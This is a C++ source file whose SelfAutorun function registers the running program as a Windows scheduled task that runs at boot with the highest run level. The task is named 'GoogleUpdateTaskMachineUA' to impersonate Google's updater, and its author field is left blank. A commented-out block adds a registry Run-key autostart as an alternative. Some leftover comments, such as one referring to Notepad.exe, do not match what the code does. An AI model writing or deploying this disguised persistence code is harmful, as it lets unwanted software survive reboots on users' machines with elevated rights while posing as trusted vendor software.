
#define _WIN32_DCOM
#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <comdef.h>
//  Include the task header file.
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

#include"header.h"

using namespace std;

BOOL SelfAutorun() {
	//  ------------------------------------------------------
	//  Initialize COM.
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr))
	{
		getchar();
		return 1;
	}

	//  Set general COM security levels.
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hr))
	{
		CoUninitialize();
		getchar();
		return 1;
	}

	//  ------------------------------------------------------
	//  Create a name for the task.
	LPCWSTR wszTaskName = L"GoogleUpdateTaskMachineUA";

	//  Get the Windows directory
	LPWSTR wstrExecutablePath = new TCHAR[MAX_PATH];
	GetModuleFileName(nullptr,wstrExecutablePath, MAX_PATH);

	//  ------------------------------------------------------
	//  Create an instance of the Task Service. 
	ITaskService *pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr))
	{
		CoUninitialize();
		getchar();
		return 1;
	}

	//  Connect to the task service.
	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr))
	{
		pService->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  ------------------------------------------------------
	//  Get the pointer to the root task folder.  
	//  This folder will hold the new task that is registered.
	ITaskFolder *pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr))
	{
		pService->Release();
		CoUninitialize();
		getchar();
		return 1;
	}
	//  If the same task exists, remove it.
	pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);
	//  Create the task builder object to create the task.
	ITaskDefinition *pTask = NULL;
	hr = pService->NewTask(0, &pTask);
	pService->Release();  // COM clean up.  Pointer is no longer used.
	if (FAILED(hr))
	{
		pRootFolder->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	IPrincipal *pPrincipal = NULL;
	hr = pTask->get_Principal(&pPrincipal);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}
	//  Set up principal run level to the highest one
	hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
	pPrincipal->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return false;
	}

	//  ------------------------------------------------------
	//  Get the registration info for setting the identification.
	IRegistrationInfo *pRegInfo = NULL;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	hr = pRegInfo->put_Author(L"");
	pRegInfo->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  ------------------------------------------------------
	//  Create the settings for the task
	ITaskSettings *pSettings = NULL;
	hr = pTask->get_Settings(&pSettings);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  Set setting values for the task. 
	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	pSettings->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//hr = pSettings->
	//  ------------------------------------------------------
	//  Get the trigger collection to insert the boot trigger.
	ITriggerCollection *pTriggerCollection = NULL;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  Add the boot trigger to the task.
	ITrigger *pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_BOOT, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	IBootTrigger *pBootTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_IBootTrigger, (void**)&pBootTrigger);
	pTrigger->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	hr = pBootTrigger->put_Id(_bstr_t(L"Trigger1"));
	// Delay the task to start 30 seconds after system start. 
	hr = pBootTrigger->put_Delay(L"PT10S");
	pBootTrigger->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  ------------------------------------------------------
	//  Add an Action to the task. This task will execute Notepad.exe.     
	IActionCollection *pActionCollection = NULL;

	////  Get the task action collection pointer.
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  Create the action, specifying it as an executable action.
	IAction *pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	IExecAction *pExecAction = NULL;
	//  QI for the executable task pointer.
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pAction->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  Set the path of the executable to Notepad.exe.
	hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath));
	pExecAction->Release();
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}

	//  ------------------------------------------------------
	//  Save the task in the root folder.
	IRegisteredTask *pRegisteredTask = NULL;
	VARIANT varPassword;
	varPassword.vt = VT_EMPTY;
	hr = pRootFolder->RegisterTaskDefinition(_bstr_t(wszTaskName), pTask, TASK_CREATE_OR_UPDATE, _variant_t(L"Local Service"), varPassword,
		TASK_LOGON_SERVICE_ACCOUNT,
		_variant_t(L""),
		&pRegisteredTask);
	if (FAILED(hr))
	{
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		getchar();
		return 1;
	}
	//  Clean up.
	pRootFolder->Release();
	pTask->Release();
	pRegisteredTask->Release();
	CoUninitialize();
	getchar();
	return 0;

	////
	// Uncomment for run this app from register
	////

	//HKEY hKey = NULL;
	//LONG lResult = 0;
	//TCHAR szExeName[MAX_PATH + 1];
	////TCHAR szWinPath[MAX_PATH + 1];
	//GetModuleFileName(GetModuleHandle(0), szExeName, STRLENN(szExeName));
	////GetWindowsDirectory(szWinPath, STRLENN(szWinPath));
	////lstrcat(szWinPath, TEXT("\\Autorun.exe"));
	////if (0 == CopyFile(szExeName, TEXT("E:\\Autorun.exe"), FALSE)) {
	//	//return FALSE;
	////
	//lResult = RegOpenKey(
	//	HKEY_CURRENT_USER,
	//	L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
	//	&hKey);
	//if (ERROR_SUCCESS != lResult) {
	//	return FALSE;
	//}
	//RegSetValueEx(hKey, L"Autorun", 0, REG_SZ, (PBYTE)(szExeName),
	//	lstrlen(szExeName) * sizeof(TCHAR) + 1);
	//RegCloseKey(hKey);
	//return TRUE;
}


